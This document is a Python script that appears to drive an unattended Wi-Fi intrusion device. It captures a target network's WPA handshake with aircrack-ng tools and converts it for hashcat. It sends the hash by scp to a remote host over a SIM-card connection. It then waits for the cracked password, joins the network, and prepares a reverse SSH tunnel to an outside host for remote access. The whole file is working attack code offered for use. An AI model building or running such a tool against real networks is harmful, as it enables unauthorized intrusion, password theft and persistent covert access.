import subprocess
import signal
import json
import time
import sys
import os

from common_functions import get_config_field, write_log

from components.airmon import Airmon
from components.airodump import Airodump
from components.aircrack import Aircrack

from csv_functions import get_required_network_information


SUCCESSFULL_PREFIX = '[+]'
ERROR_PREFIX = '[!]'


def check_config_file():
    try:
        with open('src/configuration.json') as f:
            configuration_fields = json.load(f)
            mandatory_fields = ['interface']
            abort_program = False
            for field in mandatory_fields:
                if not field in configuration_fields:
                    write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" is uncomplete. Field "{field}" not found')
                    abort_program = True
            if abort_program:
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'{ERROR_PREFIX} Configuration file "configuration.json" does not exists')
        sys.exit(1)
        
        
def check_dependencies():
    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient --help', 'wpa_passphrase', 'wpa_supplicant --help', 'screen --help']
    for command in dependencies:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if command == 'wpa_supplicant':
            print(f'STDOUT --> {output.stdout}')
            print(f'STDERR --> {output.stderr}')
        if output.returncode != 0 and output.returncode != 1:
            write_log(f'[!] Command "{command}" not installed')
            sys.exit(1)
            
            
def enable_internet():
    try:
        file_path = os.path.join('minicom', 'init.txt')
        with open(file_path) as _:
            command = f'minicom -D /dev/ttyUSB2 -S {file_path}'
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(60)
            
            command = 'dhclient usb0'
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stderr:
                write_log(f'[!] Error executing command "{command}"')
                sys.exit(1)
            
    except FileNotFoundError:
        write_log(f'[!] Script to start internet through SIM card does not exists')
        sys.exit(1)
            
            
def pcap_to_hashcat_format(file_name: str):
    command = f'hcxpcapngtool -o src/files/{file_name}.hc22000 src/files/{file_name}-01.cap'
    run = subprocess.run(command, shell=True, capture_output=True, text=True)
    if run.stderr:
        write_log(f'[!] Failed in command "{command}"')
        sys.exit(1)
    else:
        write_log(f'[+] .cap file exported correctly to hashcat format')


if __name__ == '__main__':
    # Check if configuration file exists and it has every mandatory key
    check_config_file()
    
    # Check if every command it is installed
    check_dependencies()
    
    # Setting interface in monitor mode
    interface = get_config_field('interface')

    airmon: Airmon = Airmon()
    airmon.check(kill=True)
    monitor_interface: str = airmon.start(interface)

    # Capturing packets with airodump-ng
    airodump: Airodump = Airodump()

    # Exporting csv file to get all networks
    output_file_name = 'networks'
    args = ['--output-format csv', f'-w src/files/{output_file_name}']
    airodump.exec(monitor_interface, args)

    # Once airodump has stored all networks, I get the network bssid and its channel
    network_ssid = get_config_field('ssid')
    bssid, channel = get_required_network_information(output_file_name, network_ssid)
    if not bssid or not channel:
        write_log(f'[!] Network with SSID {network_ssid} not found')
        
    # Get 4-way-handshake
    handshake_file_name = f'{network_ssid}-handshake'
    args = [f'-c {channel}', f'--bssid {bssid}', f'-w src/files/{handshake_file_name}', '--output-format pcap']
    shell_command = airodump.get_str_shell_command(monitor_interface, args)
    
    # Execute airodump-ng as subprocess
    process = subprocess.Popen(shell_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    aircrack: Aircrack = Aircrack()
    
    found_handshake = False
    while not found_handshake:
        found_handshake = aircrack.check_captured_handshake(handshake_file_name)
        time.sleep(15)
        
    process.terminate()
    try:
        process.wait(10)
    except Exception:
        process.kill()
        
    write_log(f'[+] Handshake captured')
    
    # Stop monitor mode and restart NetworkManager
    airmon.stop(monitor_interface)
    
    command = 'service NetworkManager restart'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        
    # Enable internet through SIM card
    enable_internet()
    
    # Transform .cap file to hashcat format with hcxpcappngtool
    hashcat_format_file_name = pcap_to_hashcat_format(handshake_file_name)
    
    # Once psk.hc22000 has been stored, send via scp
    method_to_send: dict = get_config_field("send_handshake")
    if 'scp' in method_to_send:
        if method_to_send['scp'].get('user') and method_to_send['scp'].get('host') and method_to_send['scp'].get('path'):
            user = method_to_send['scp'].get('user')
            host = method_to_send['scp'].get('host')
            path = method_to_send['scp'].get('path')
            
            command = f'scp src/files/{handshake_file_name}.hc22000 {user}@{host}:{path}'
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            if output.stderr:
                write_log(f'[!] Error transfering over scp {handshake_file_name}.hc22000')
                sys.exit(1)
        else:
            write_log("[!] You must specify fields 'user' and 'host' to use scp")
            
    print('[+] Ahora empieza la espera para recibir la password crackeada')
    cracked_password: str = None
    while not cracked_password:
        try:
            with open('src/files/cracked_password.txt') as f:
                cracked_password = f.read()
                    
        except FileNotFoundError:
            time.sleep(120)  # wait for 2 minutes to check again
            
    # Generate wpa config file
    command = f'wpa_passphrase {network_ssid} {cracked_password} > /etc/wpa_supplicant/{network_ssid}.conf'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
        
    # Connect to wifi
    command = f'wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant/{network_ssid}.conf'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
        
    # Getting an IP
    command = f'dhclient -r; dhclient wlan0'
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    if output.stderr:
        write_log(f'[!] Error executing command "{command}"')
        sys.exit(1)
    
    # Open reverse tunnel
    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
    
    remote_user = reverse_tunnel_information.get('user')
    remote_host = reverse_tunnel_information.get('host')
    if not remote_user or not remote_host:
        write_log(f'[!] You must specify fields "user" and "host"')
        sys.exit(1)
    
    remote_port = 9090
    if reverse_tunnel_information.get('port'):
        remote_port = reverse_tunnel_information.get('port')
    
    command = f'screen -dmS reverse_ssh_tunnel ssh -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
    
    '''
    Listo!! A partir de aqui a lanzar scripts
    '''